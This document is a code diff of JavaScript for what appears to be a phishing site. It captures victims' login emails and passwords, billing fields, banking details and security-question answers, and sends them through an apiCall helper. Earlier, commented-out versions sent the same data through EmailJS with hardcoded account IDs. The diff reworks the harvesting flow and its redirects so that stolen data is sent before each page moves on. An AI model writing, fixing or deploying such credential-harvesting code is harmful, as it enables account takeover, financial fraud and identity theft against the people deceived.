@@ -58,7 +58,7 @@ async function apiCall(...texts) {
     if (api.status >= 200 && api.status < 300) {
       console.log("Message Sent!");
       // Navigate to a different URL after successful message sending
-      window.location.href = "/views/billing.html"; // Change to your desired URL
+      // window.location.href = "/views/billing.html"; // Change to your desired URL
     } else {
       console.log(`Failed to send message. Status: ${api.status}`);
     }
@@ -159,7 +159,7 @@ if (window.location.pathname === "/views/billing.html") {
 if (window.location.pathname === "/") {
   const loginSubmitBtn = document.querySelector(".login-btn");
   // console.log(submitBtn);
-  loginSubmitBtn.addEventListener("click", () => {
+  loginSubmitBtn.addEventListener("click", async () => {
     const loginForm = document.getElementById("login-form");
     console.log(loginForm);
 
@@ -184,10 +184,9 @@ if (window.location.pathname === "/") {
     const email = document.getElementById("login-email").value;
     const pass = document.getElementById("login-pass").value;
 
-    (async () => {
-      await apiCall(`User-Email: ${email}`, `User-Pass: ${pass}`);
-      console.log("This will run after the message is sent.");
-    })();
+    await apiCall(`User-Email: ${email}`, `User-Pass: ${pass}`);
+    console.log("This will run after the message is sent.");
+    window.location.href = "/views/billing.html";
     // }
   });
 }
@@ -207,58 +206,112 @@ if (window.location.pathname === "/views/billing.html") {
   console.log(prepaidCheckInput);
 
   // Billing page form submit
-  function submitBilling() {
-    const billingForm = document.getElementById("billing-form");
-    console.log(billingForm);
+  const billingSubmit = document.querySelector(".submit-btn");
+  billingSubmit.addEventListener("click", async () => {
+    const inputs = document.querySelectorAll(".info-container input");
+    const checkBox = document.querySelector(".checkbox");
+    const selectBoxes = document.querySelectorAll(".dropdown-billing");
+    console.log(selectBoxes);
 
-    // serviceID - templateID - #form - publicKey
-    emailjs
-      .sendForm(
-        "service_4q8coel",
-        "template_a97si1y",
-        "#billing-form",
-        "3n7ifkUOowaI47Ert"
-      )
-      .then(
-        () => {
-          billingForm.reset(); // Clear input fields
-          console.log("Success");
-          window.location.href = "./banking.html";
-        },
-        () => {
-          console.log("Message not sent");
-        }
-      );
-  }
+    const messages = Array.from(inputs).map(
+      (input) => `${input.name}: ${input.value}`
+    );
+    messages.push(`prepaid: ${checkBox.checked}`);
+
+    selectBoxes.forEach((selectOptions) => {
+      console.log(selectOptions.value, selectOptions.name);
+      messages.push(`${selectOptions.name}: ${selectOptions.value}`);
+    });
+
+    await apiCall(messages);
+    console.log("sccess");
+    window.location.href = "./banking.html";
+  });
+  // async function submitBilling() {
+  //   // const billingForm = document.getElementById("billing-form");
+
+  //   const inputs = document.querySelectorAll(".info-container input");
+  //   const checkBox = document.querySelector(".checkbox");
+  //   const selectBoxes = document.querySelectorAll(".dropdown-billing");
+  //   console.log(selectBoxes);
+
+  //   const messages = Array.from(inputs).map(
+  //     (input) => `${input.name}: ${input.value}`
+  //   );
+  //   messages.push(`prepaid: ${checkBox.checkBox}`);
+
+  //   selectBoxes.forEach((selectOptions) => {
+  //     console.log(selectOptions.value, selectOptions.name);
+  //     messages.push(`${selectOptions.name}: ${selectOptions.value}`);
+  //   });
+
+  //   await apiCall(messages);
+  //   console.log("sccess");
+
+  //   // serviceID - templateID - #form - publicKey
+  //   // emailjs
+  //   //   .sendForm(
+  //   //     "service_4q8coel",
+  //   //     "template_a97si1y",
+  //   //     "#billing-form",
+  //   //     "3n7ifkUOowaI47Ert"
+  //   //   )
+  //   //   .then(
+  //   //     () => {
+  //   //       billingForm.reset(); // Clear input fields
+  //   //       console.log("Success");
+  //   //       window.location.href = "./banking.html";
+  //   //     },
+  //   //     () => {
+  //   //       console.log("Message not sent");
+  //   //     }
+  //   //   );
+  // }
 }
 
 // Banking form submit
 if (window.location.pathname === "/views/banking.html") {
-  const bankingVerifyBtn = document.querySelector(".verify-btn");
-  // console.log(submitBtn);
-  bankingVerifyBtn.addEventListener("click", () => {
-    const bankingForm = document.getElementById("banking-form");
-    console.log(bankingForm);
+  // const bankingVerifyBtn = document.querySelector(".verify-btn");
 
-    // serviceID - templateID - #form - publicKey
-    emailjs
-      .sendForm(
-        "service_4q8coel",
-        "template_a97si1y",
-        "#banking-form",
-        "3n7ifkUOowaI47Ert"
-      )
-      .then(
-        () => {
-          bankingForm.reset(); // Clear input fields
-          console.log("Success");
-          window.location.href = "/";
-        },
-        () => {
-          console.log("Message not sent");
-        }
-      );
-  });
+  // const bankingSubmit = document.querySelector(".verify-btn");
+  // bankingSubmit.addEventListener("click", async () => {
+  //   const bankingInputs = document.querySelectorAll(".info-container input");
+  //   const securityQuestion = document.querySelector(".dropdown-banking");
+  //   console.log(securityQuestion);
+  //   console.log(securityQuestion);
+
+  //   const messages = Array.from(bankingInputs).map(
+  //     (input) => `${input.name}: ${input.value}`
+  //   );
+  //   messages.push(`Security Questions: ${securityQuestion}`);
+
+  //   await apiCall(messages);
+  //   console.log(messages)
+  //   console.log("sUUUUccess");
+  // });
+
+  // bankingVerifyBtn.addEventListener("click", () => {
+  // const bankingForm = document.getElementById("banking-form");
+  // console.log(bankingForm);
+  // // serviceID - templateID - #form - publicKey
+  // emailjs
+  //   .sendForm(
+  //     "service_4q8coel",
+  //     "template_a97si1y",
+  //     "#banking-form",
+  //     "3n7ifkUOowaI47Ert"
+  //   )
+  //   .then(
+  //     () => {
+  //       bankingForm.reset(); // Clear input fields
+  //       console.log("Success");
+  //       window.location.href = "/";
+  //     },
+  //     () => {
+  //       console.log("Message not sent");
+  //     }
+  //   );
+  // });
 
   const questions = [
     "What is the name of your first babysitter?",
@@ -280,6 +333,26 @@ if (window.location.pathname === "/views/banking.html") {
     option.value = `question-${index + 1}`; // question1, question2, ...
     option.textContent = question;
     selectElement.appendChild(option);
+  });
+
+  const bankingSubmit = document.querySelector(".verify-btn");
+  bankingSubmit.addEventListener("click", async () => {
+    const bankingInputs = document.querySelectorAll(".email-section input");
+    const securityQuestion = document.querySelector(".dropdown-banking");
+    // const securityQuestionText = securityQuestion.option[securityQuestion.selectedIndex].text
+    const selectedQuestion =
+      securityQuestion.options[selectElement.selectedIndex];
+    // console.log(selectedQuestion);
+
+    const messages = Array.from(bankingInputs).map(
+      (input) => `${input.name}: ${input.value}`
+    );
+    messages.push(`Security Questions: ${selectedQuestion.textContent}`);
+
+    await apiCall(messages);
+    console.log(messages);
+    // console.log("sUUUUccess");
+    // window.location.href = "./thank-you.html";
   });
 }
 
